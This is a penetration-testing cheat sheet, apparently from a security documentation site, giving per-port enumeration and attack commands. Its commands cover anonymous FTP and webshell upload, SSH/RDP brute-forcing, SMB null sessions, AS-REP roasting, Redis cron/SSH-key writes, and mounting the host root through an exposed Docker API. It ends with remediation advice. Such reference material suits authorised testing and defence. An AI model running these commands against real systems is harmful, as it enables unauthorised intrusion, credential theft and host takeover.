---
tags:
  - Network
  - Recon
---

# :material-lan-connect: Ports & Services

<span class="pill pill-easy">start here</span> <span class="pill pill-info">enumeration</span>

The grab-and-go page: you scanned a host, something's open — jump to the port and
run the checks. Every service gets a one-line *why it matters* and a dense,
paste-ready block. Full recon methodology lives in [Network Recon](recon.md).

!!! abstract "TL;DR"
    Fast full-port sweep → targeted `-sV -sC` on what's open → then work each
    service below. Weak creds, anonymous access, and outdated versions are the
    fastest wins.

```bash
# The opening move for any host
rustscan -a $IP --range 1-65535 -- -sV -sC -oN nmap.txt
# or staged nmap
nmap -p- --min-rate 5000 -T4 $IP -oG allports   # find open ports
nmap -p<ports> -sVC -A $IP -oN deep.txt          # deep scan just those
```

## :material-numeric: FTP — 21

Anonymous login and writable roots are common; check version for known CVEs.

```bash
nmap --script "ftp-* and not brute" -p21 $IP
ftp $IP                      # try anonymous : anonymous / <blank>
# grab everything if you get in
wget -r ftp://anonymous:anonymous@$IP/
# writable? drop a webshell if the FTP root == web root
```

!!! loot "Anonymous FTP often == free file read/write"
    `anonymous:anonymous`. If the FTP root maps to the web server, upload a shell.

## :material-console-network: SSH — 22

Weak creds and user-enum on old OpenSSH (`< 7.7`). Keys beat passwords.

```bash
nmap -p22 --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey $IP
ssh-audit $IP                                # config/algo weaknesses
hydra -L users.txt -P rockyou.txt ssh://$IP -t4
# found a private key? fix perms and use it
chmod 600 id_rsa && ssh -i id_rsa user@$IP
```

## :material-email: SMTP — 25 / 465 / 587

Username enumeration and open-relay checks.

```bash
nmap -p25 --script smtp-commands,smtp-open-relay,smtp-enum-users $IP
smtp-user-enum -M VRFY -U users.txt -t $IP    # VRFY/EXPN/RCPT
# manual
nc $IP 25 → HELO x → VRFY root
```

## :material-dns: DNS — 53

Zone transfers dump every record; see [DNS Enumeration](dns.md).

```bash
dig axfr @$IP domain.local                    # zone transfer (jackpot)
dnsrecon -d domain.local -n $IP -t axfr
nslookup -type=any domain.local $IP
```

## :material-web: HTTP/HTTPS — 80 / 443 / 8080 / 8443

The biggest attack surface. Fingerprint → fuzz → attack.

```bash
whatweb -a3 http://$IP ; nuclei -u http://$IP
ffuf -u http://$IP/FUZZ -w raft-medium-directories.txt -mc 200,301,302,403
# vhosts (different site on same IP)
ffuf -u http://$IP -H "Host: FUZZ.domain.com" -w subdomains.txt -fs <baseline>
gobuster dir -u http://$IP -w common.txt -x php,txt,html
```

Identify the tech, then jump to the matching cheat page → [Web Technologies](../webtech/index.md).
Attacks live under [Web Apps](../web/index.md).

## :material-folder-network: SMB — 139 / 445

Null sessions, shares, and RID cycling. Deep dive: [SMB](smb.md).

```bash
nxc smb $IP -u '' -p '' --shares                 # null session
nxc smb $IP -u guest -p '' --rid-brute           # enumerate users
enum4linux-ng -A $IP
smbclient -N -L //$IP/                           # list shares anon
smbmap -H $IP -u null                            # readable/writable?
```

!!! loot "Null/guest sessions leak users, shares, and policy"
    A user list from RID cycling feeds [Password Spraying](password-spraying.md) and [Kerberos](kerberos.md).

## :material-account-network: LDAP — 389 / 636

Anonymous binds dump the whole directory.

```bash
nmap -p389 --script ldap-search,ldap-rootdse $IP
ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local"   # anon bind dump
nxc ldap $IP -u user -p pass --users
```

## :material-microsoft-windows: MSRPC / WinRM — 135 / 5985 / 5986

```bash
rpcclient -U '' -N $IP                           # then: enumdomusers, querydispinfo
nxc winrm $IP -u user -p pass                     # (Pwn3d! = shell)
evil-winrm -i $IP -u user -p pass                 # interactive shell
```

## :material-database: Databases — MSSQL 1433 · MySQL 3306 · Postgres 5432 · Oracle 1521 · Redis 6379

```bash
# MSSQL — see the dedicated MSSQL note for xp_cmdshell → RCE
nxc mssql $IP -u sa -p pass ; impacket-mssqlclient sa:pass@$IP
# MySQL
mysql -h $IP -u root -p ; nmap -p3306 --script mysql-empty-password $IP
# PostgreSQL
psql -h $IP -U postgres ; nmap -p5432 --script pgsql-brute $IP
# Oracle
odat all -s $IP ; nmap -p1521 --script oracle-sid-brute $IP
# Redis (often unauth) — write SSH keys / webshell / cron
redis-cli -h $IP ; redis-cli -h $IP info
```

!!! loot "MSSQL/Redis frequently reach RCE"
    MSSQL `xp_cmdshell` and unauth Redis (write a cron/SSH key) are classic
    DB-to-shell paths → [MSSQL](mssql.md), [SQLi → RCE](../web/sqli.md).

## :material-remote-desktop: RDP / VNC — 3389 / 5900

```bash
nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption $IP
xfreerdp /u:user /p:pass /v:$IP +clipboard        # or nla-redirection checks
hydra -L users.txt -P pass.txt rdp://$IP
```

## :material-server-network: SNMP — 161/udp · NFS — 2049 · IPMI — 623/udp

```bash
# SNMP — community strings leak processes, users, routes
onesixtyone -c communities.txt $IP ; snmpwalk -v2c -c public $IP
# NFS — mountable exports, no_root_squash → privesc
showmount -e $IP ; mount -t nfs $IP:/export /mnt
# IPMI — hash dump (CVE-2013-4786)
nmap -p623 --script ipmi-cipher-zero,ipmi-brute $IP
```

## :material-console-line: Telnet — 23 · Finger — 79 · r-services — 512-514

Legacy cleartext services — creds sniffable, often trust-based auth.

```bash
nmap -p23 --script telnet-ntlm-info,telnet-encryption $IP   # banner may leak host/OS
telnet $IP 23
finger @$IP ; finger root@$IP                # user enumeration (port 79)
rlogin -l root $IP ; rsh $IP id              # .rhosts trust abuse (512-514)
```

## :material-ticket: Kerberos — 88

Present == a Domain Controller. Enumerate users, then roast (no creds needed for
AS-REP). Full attacks: [Kerberos](kerberos.md).

```bash
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN' $IP
kerbrute userenum -d domain.local --dc $IP users.txt   # valid users, pre-auth
# AS-REP roast users without pre-auth, no password required
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip $IP -no-pass
```

## :material-email-outline: POP3 — 110/995 · IMAP — 143/993

```bash
nmap -p110,143 --script "pop3-* or imap-*" $IP
# read mail after auth (creds from spraying/dumps)
curl -k "imaps://$IP" --user 'user:pass'
openssl s_client -connect $IP:993          # then a1 LOGIN user pass
```

## :material-hexagon-multiple: RPCbind — 111 · Java RMI — 1099

```bash
rpcinfo -p $IP                              # 111: what RPC services? (NFS, NIS…)
nmap -p111 --script nfs-ls,nfs-showmount $IP
# Java RMI — deserialization RCE with the right gadget
nmap -p1099 --script rmi-dumpregistry $IP
# beanshooter / ysoserial against exposed RMI registries
```

## :material-sync: rsync — 873

Anonymous modules expose (and sometimes write) whole filesystems.

```bash
nmap -p873 --script rsync-list-modules $IP
rsync -av --list-only rsync://$IP/            # list modules
rsync -av rsync://$IP/<module>/ ./loot/       # pull files (often anon)
```

## :material-docker: Docker API — 2375/2376

An exposed Docker daemon == root on the host (mount `/`).

```bash
curl -s http://$IP:2375/version              # unauth API present?
docker -H tcp://$IP:2375 ps
docker -H tcp://$IP:2375 run -v /:/mnt -it alpine chroot /mnt sh   # host root
```

!!! loot "Open Docker/Redis/Kubelet = host takeover"
    Unauth Docker API (2375), Redis (6379), and Kubelet (10250) each hand you code
    execution on the host → [Container Escape](../cloud/containers.md).

## :material-database-search: NoSQL & caches — MongoDB 27017 · CouchDB 5984 · Memcached 11211 · Elasticsearch 9200

Frequently unauthenticated; dump everything.

```bash
# MongoDB
mongosh "mongodb://$IP:27017" --eval 'db.adminCommand({listDatabases:1})'
nmap -p27017 --script mongodb-databases,mongodb-info $IP
# CouchDB (REST) — CVE-2017-12635 privilege escalation → admin → RCE
curl -s http://$IP:5984/_all_dbs
# Memcached — dump keys (also a UDP amplification vector)
memcstat --servers=$IP ; nc $IP 11211 <<< $'stats items\r'
# Elasticsearch/Kibana — see the dedicated page
curl -s http://$IP:9200/_cat/indices?v      # -> ../webtech/kibana-elk.md
```

## :material-shield-check: Remediation (for the report)

- Close/​firewall unused services; never expose SMB/RDP/DB ports to untrusted nets.
- Kill anonymous access (FTP, SMB null, LDAP anon bind, unauth Redis).
- Patch to current versions; enforce strong auth (keys, NLA, no default creds).

## :material-link-variant: Related

- Upstream: [Network Recon](recon.md) · [DNS](dns.md). Service deep-dives: [SMB](smb.md) · [MSSQL](mssql.md).
- Web tech fingerprint → [Web Technologies](../webtech/index.md); web bugs → [Web Apps](../web/index.md).
- Cred lists for brute/spray → [Wordlist Reference](../reference/wordlists.md).
- Reference: [HackTricks Pentesting Ports](https://book.hacktricks.wiki/en/network-services-pentesting/index.html).
